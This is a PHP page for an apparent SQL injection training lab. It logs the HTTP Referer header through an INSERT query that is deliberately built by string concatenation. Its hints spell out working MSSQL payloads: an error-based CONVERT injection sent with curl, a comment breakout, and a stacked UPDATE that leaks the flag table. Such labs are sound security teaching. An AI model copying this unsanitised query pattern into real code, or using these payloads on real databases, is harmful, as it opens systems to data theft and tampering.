<?php
require_once __DIR__ . '/../../includes/db.php';

$mode = $_GET['mode'] ?? 'black';
$verify_error = null;

/* =====================
   FLAG VERIFY
===================== */
if (isset($_POST['flag'])) {
    $submitted = $_POST['flag'];

    if ($conn) {
        // Live mode: verify against DB
        try {
            $stmt = $conn->query("SELECT TOP 1 flag FROM flags");
            $row = $stmt->fetch(PDO::FETCH_ASSOC);
            if ($row && $submitted === $row['flag']) {
                $_SESSION['mssql_lab15_solved'] = true;
                header("Location: " . url_lab_from_slug("mssql/lab15", $mode, $_GET['ref'] ?? ''));
                exit;
            } else {
                $verify_error = "Incorrect. Keep trying!";
            }
        } catch (PDOException $e) {
            $verify_error = "Database error. Is the MSSQL container running?";
        }
    } else {
        $verify_error = "Database connection failed. Is the MSSQL container running?";
    }
}
?>

<!-- Lab Description -->
<div class="card">
    <h3>Lab 15. Header Injection: Referer</h3>

    <h4>Scenario</h4>
    <p>
        An analytics tracking system logs the <strong>Referer</strong> HTTP header
        into the database for each page visit. The developer assumed headers are safe
        because users cannot modify them through the browser's URL bar.
    </p>
    <p>
        The <code>Referer</code> header is inserted directly into an <code>INSERT</code>
        statement without sanitization, creating a <strong>second-order injection point</strong>
        in the HTTP header.
    </p>

    <h4>Objective</h4>
    <p>
        Inject SQL through the <strong>Referer</strong> header to extract the flag from
        the <code>flags</code> table. Use <code>curl</code> or Burp Suite to set custom headers.
        Submit the flag below.
    </p>

    <h4>Hints</h4>
    <span class="hint-toggle" data-hint="hint1">&#128161; Click for hints</span>
    <div id="hint1" class="hint-content">
        1. The Referer header is injected into: <code>INSERT INTO page_visits (url, referer, ...) VALUES ('...', '$referer', ...)</code><br>
        2. Use curl: <code>curl -H "Referer: ' + CONVERT(INT, (SELECT TOP 1 flag FROM flags)) + '" http://target/...</code><br>
        3. Or break out of INSERT: <code>Referer: '); -- -</code><br>
        4. Stacked query: <code>Referer: '); UPDATE page_visits SET referer=(SELECT TOP 1 flag FROM flags) WHERE id=1; -- -</code><br>
        5. Then view the visit log to see the modified referer value.
    </div>
</div>

<!-- Verify Flag -->
<div class="card">
    <h4>Submit Flag</h4>
    <form method="POST" class="form-row">
        <input type="text" name="flag" class="input" placeholder="Enter the flag..." required>
        <button type="submit" class="btn btn-primary">Verify</button>
    </form>

    <?php if ($verify_error): ?>
        <div class="result-error result-box"><?= htmlspecialchars($verify_error) ?></div>
    <?php endif; ?>
</div>

<!-- Solved Banner -->
<?php if (!empty($_SESSION['mssql_lab15_solved'])): ?>

<div class="solved-banner">
    <span class="solved-icon">&#127942;</span>
    <div>
        <div class="solved-title">Lab Solved!</div>
        <div class="solved-desc">You successfully exploited HTTP header injection in the Referer field on MSSQL.</div>
    </div>
</div>

<?php else: ?>

<!-- Visit Log Display -->
<div class="card">
    <h4>Page Visit Analytics</h4>
    <p>
        The table below shows recent page visits. Each visit logs the URL, Referer header,
        and User-Agent. <strong>Visit this page to generate a log entry.</strong>
    </p>

    <form method="POST" class="form-row">
<input type="hidden" name="visit" value="1">
        <button type="submit" class="btn btn-primary">Log a Visit</button>
    </form>
</div>

<?php
// Log the visit when requested
if (isset($_POST['visit'])) {
    $referer = $_SERVER['HTTP_REFERER'] ?? 'direct';
    $page_url = $_SERVER['REQUEST_URI'] ?? '/';
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

    // INTENTIONALLY VULNERABLE. Referer header directly concatenated
    $query = "INSERT INTO page_visits (url, referer, visitor_ip) VALUES ('$page_url', '$referer', '$ip')";

    // Show the executed query in a terminal block
    echo '<div class="terminal query-output">';
    echo '  <div class="terminal-header">';
    echo '    <span class="terminal-dot red"></span>';
    echo '    <span class="terminal-dot yellow"></span>';
    echo '    <span class="terminal-dot green"></span>';
    echo '    <span class="terminal-title">MSSQL Query</span>';
    echo '  </div>';
    echo '  <div class="terminal-body" data-highlight="sql">';
    echo '    <span class="prompt">1&gt; </span>' . htmlspecialchars($query);
    echo '  </div>';
    echo '</div>';

    if ($conn) {
        try {
            $conn->query($query);
            echo '<div class="result-success result-box"><strong>Visit logged successfully.</strong></div>';
        } catch (PDOException $e) {
            echo '<div class="result-error result-box">';
            echo '<strong>MSSQL Error:</strong><br>' . htmlspecialchars($e->getMessage());
            echo '</div>';
        }
    } else {
        echo '<div class="result-error result-box">';
        echo '<strong>Error:</strong> Database connection failed. Is the MSSQL container running?';
        echo '</div>';
    }
}

// Display visit log
if ($conn) {
    try {
        $stmt = $conn->query("SELECT TOP 10 id, url, referer, visitor_ip FROM page_visits ORDER BY id DESC");
        $rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

        if (!empty($rows)) {
            echo '<div class="result-data result-box">';
            echo '<table style="width:100%; border-collapse:collapse;">';
            echo '<tr>';
            echo '<th style="text-align:left; padding:6px; border-bottom:1px solid #444;">ID</th>';
            echo '<th style="text-align:left; padding:6px; border-bottom:1px solid #444;">URL</th>';
            echo '<th style="text-align:left; padding:6px; border-bottom:1px solid #444;">Referer</th>';
            echo '<th style="text-align:left; padding:6px; border-bottom:1px solid #444;">IP</th>';
            echo '</tr>';
            foreach ($rows as $row) {
                echo '<tr>';
                echo '<td style="padding:6px; border-bottom:1px solid #333;">' . htmlspecialchars($row['id'] ?? '') . '</td>';
                echo '<td style="padding:6px; border-bottom:1px solid #333;">' . htmlspecialchars($row['url'] ?? '') . '</td>';
                echo '<td style="padding:6px; border-bottom:1px solid #333;">' . htmlspecialchars($row['referer'] ?? '') . '</td>';
                echo '<td style="padding:6px; border-bottom:1px solid #333;">' . htmlspecialchars($row['visitor_ip'] ?? '') . '</td>';
                echo '</tr>';
            }
            echo '</table>';
            echo '</div>';
        }
    } catch (PDOException $e) {
        // Suppress display errors for the log table
    }
}
?>

<?php endif; ?>
